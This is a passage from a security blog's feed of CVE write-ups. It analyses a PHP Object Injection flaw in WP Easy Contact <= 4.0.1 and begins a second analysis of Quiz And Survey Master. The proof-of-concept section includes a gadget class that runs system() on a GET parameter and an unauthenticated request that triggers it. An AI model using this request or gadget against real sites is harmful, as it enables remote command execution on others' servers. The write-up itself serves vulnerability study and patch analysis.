0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version – WP Easy Contact&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;4.0.1&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;4.0.2&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability originates from allowing attackers to instantiate arbitrary objects from input → &lt;strong&gt;PHP Object Injection&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$widg_arr = explode(&amp;#34;-&amp;#34;, $div_id);&#xA;$mywidg = new $widg_arr[1]();&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The patch adds a whitelist and sanitizes the input → only valid classes can be instantiated, removing the vulnerability.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-18-cve-2025-53572/diff.png&#34; title=&#34;Changes in the patch&#34; data-thumbnail=&#34;/posts/2025-11-18-cve-2025-53572/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Changes in the patch&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-18-cve-2025-53572/diff.png&#39; alt=&#34;Diff&#34; height=&#34;766&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Changes in the patch&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers an Ajax action for unauthenticated users (&lt;code&gt;wp_ajax_nopriv&lt;/code&gt;):&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action(&amp;#39;wp_ajax_nopriv_emd_get_widg_pagenum&amp;#39;, &amp;#39;emd_get_widg_pagenum&amp;#39;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;When a request is sent to &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; with &lt;code&gt;action=emd_get_widg_pagenum&lt;/code&gt;, the callback &lt;code&gt;emd_get_widg_pagenum&lt;/code&gt; is executed:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function emd_get_widg_pagenum(){&#xA;&#x9;$response = false;&#xA;&#x9;$pageno = isset($_GET[&amp;#39;pageno&amp;#39;]) ? (int) $_GET[&amp;#39;pageno&amp;#39;] : 1;&#xA;&#x9;$div_id = isset($_GET[&amp;#39;div_id&amp;#39;]) ? sanitize_text_field($_GET[&amp;#39;div_id&amp;#39;]) : &amp;#39;&amp;#39;;&#xA;&#x9;$myapp = isset($_GET[&amp;#39;app&amp;#39;]) ? sanitize_text_field($_GET[&amp;#39;app&amp;#39;]) : &amp;#39;&amp;#39;;&#xA;&#x9;if(!empty($div_id)){&#xA;&#x9;&#x9;$pids = Array();&#xA;&#x9;&#x9;$front_ents = emd_find_limitby(&amp;#39;frontend&amp;#39;, $myapp);&#xA;&#x9;&#x9;$widg_arr = explode(&amp;#34;-&amp;#34;,$div_id);&#xA;&#x9;&#x9;$mywidg = new $widg_arr[1]();&#xA;&#x9;&#x9;...&#xA;&#x9;}&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;For the line &lt;code&gt;new $widg_arr[1]()&lt;/code&gt; to run, the condition &lt;code&gt;if(!empty($div_id))&lt;/code&gt; must be satisfied, meaning the GET parameter &lt;code&gt;div_id&lt;/code&gt; has to be provided.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;$widg_arr[1]&lt;/code&gt; is taken from the array obtained after &lt;code&gt;explode&lt;/code&gt; on the value of &lt;code&gt;$_GET[&#39;div_id&#39;]&lt;/code&gt;.&#xA;For example, if &lt;code&gt;div_id=abc-Class&lt;/code&gt;, then &lt;code&gt;$widg_arr[1]&lt;/code&gt; equals &lt;code&gt;Class&lt;/code&gt;, allowing arbitrary object instantiation through &lt;code&gt;new $widg_arr[1]()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;Client sends GET /wp-admin/admin-ajax.php?action=emd_get_widg_pagenum&amp;amp;div_id=abc-Class&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;WordPress hook: wp_ajax_nopriv_emd_get_widg_pagenum&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;Callback: emd_get_widg_pagenum()&amp;#34;]&#xA;&#xA;C --&amp;gt; D{&amp;#34;Check if div_id is not empty&amp;#34;}&#xA;D -- True --&amp;gt; E[&amp;#34;explode(&amp;#39;-&amp;#39;, div_id) → $widg_arr&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;Instantiate object: new $widg_arr[1]()&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Create a test class inside &lt;code&gt;wp-config.php&lt;/code&gt;:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;class ObjectInjection {&#xA;  public $command;&#xA;&#xA;  public function __construct(){&#xA;    $this-&amp;gt;command = $_GET[&amp;#39;cmd&amp;#39;];&#xA;  }&#xA;  function __destruct(){&#xA;    die(system($this-&amp;gt;command));&#xA;  }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Send the request with payload:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /wp-admin/admin-ajax.php?action=emd_get_widg_pagenum&amp;amp;div_id=abc-ObjectInjection&amp;amp;cmd=ls&amp;#43;/&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-18-cve-2025-53572/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2025-11-18-cve-2025-53572/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-18-cve-2025-53572/result.png&#39; alt=&#34;Result&#34; height=&#34;787&#34; width=&#34;1477&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;p&gt;The vulnerability in &lt;strong&gt;WP Easy Contact &amp;lt;= 4.0.1&lt;/strong&gt; stems from unsafe input handling, allowing direct object instantiation from user-controlled data. By abusing the &lt;code&gt;div_id&lt;/code&gt; parameter, attackers can achieve &lt;strong&gt;PHP Object Injection&lt;/strong&gt; leading to arbitrary code execution. The patch in &lt;strong&gt;4.0.2&lt;/strong&gt; fixes the issue by introducing a whitelist and sanitizing input, ensuring only valid classes can be instantiated. This clearly demonstrates how unsafe deserialization can become a critical exploit vector, especially when combined with unauthenticated access.&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Unauthenticated attack surface&lt;/strong&gt;: Triggered via &lt;code&gt;wp_ajax_nopriv&lt;/code&gt;, no login required.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Root cause&lt;/strong&gt;: Directly using user input (&lt;code&gt;new $widg_arr[1]()&lt;/code&gt;), no validation.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Fix strategy&lt;/strong&gt;: Apply &lt;strong&gt;whitelist&lt;/strong&gt; and &lt;strong&gt;sanitize&lt;/strong&gt; to restrict valid classes.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Best practice&lt;/strong&gt;: Always validate and sanitize input, avoid unsafe deserialization, and restrict object instantiation from untrusted sources.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Deserialization&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/wp-easy-contact/vulnerability/wordpress-wp-easy-contact-plugin-4-0-1-php-object-injection-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress WP Easy Contact Plugin &amp;lt;= 4.0.1 is vulnerable to a high priority PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-49401 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-11-17-cve-2025-49401/</link>
      <pubDate>Mon, 17 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-11-17-cve-2025-49401/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-17-cve-2025-49401/app.gif&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;This plugin performs &lt;strong&gt;unserialize&lt;/strong&gt; on user-supplied data through a form field, which may allow &lt;strong&gt;unauthenticated users&lt;/strong&gt; to perform &lt;strong&gt;PHP Object Injection&lt;/strong&gt; if a suitable gadget exists in the system.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-49401&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-49401&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: PHP Object Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 10.2.5&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 10.2.6&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/quiz-master-next/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Quiz And Survey Master Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; – &lt;strong&gt;Quiz And Survey Master&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;10.2.5&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;10.2.6&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability originates from the use of &lt;code&gt;maybe_unserialize()&lt;/code&gt;. Although some checks exist, this mechanism is still not fully secure.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( preg_match( &amp;#39;/^(O|C):\d&amp;#43;:/&amp;#39;, $qmn_sanitize_random_ids ) ) {&#xA;    return &amp;#39;&amp;#39;;&#xA;}&#xA;if ( is_serialized( $qmn_sanitize_random_ids ) ) {&#xA;    $unserialized = maybe_unserialize( $qmn_sanitize_random_ids );&#xA;    if ( ! is_object( $unserialized ) &amp;amp;&amp;amp; ! is_resource( $unserialized ) ) {&#xA;        return $unserialized;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The patch replaces &lt;code&gt;maybe_unserialize()&lt;/code&gt; with &lt;code&gt;unserialize()&lt;/code&gt; and blocks all object creation using &lt;code&gt;[&#39;allowed_classes&#39; =&amp;gt; false]&lt;/code&gt; → effectively preventing PHP Object Injection.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; 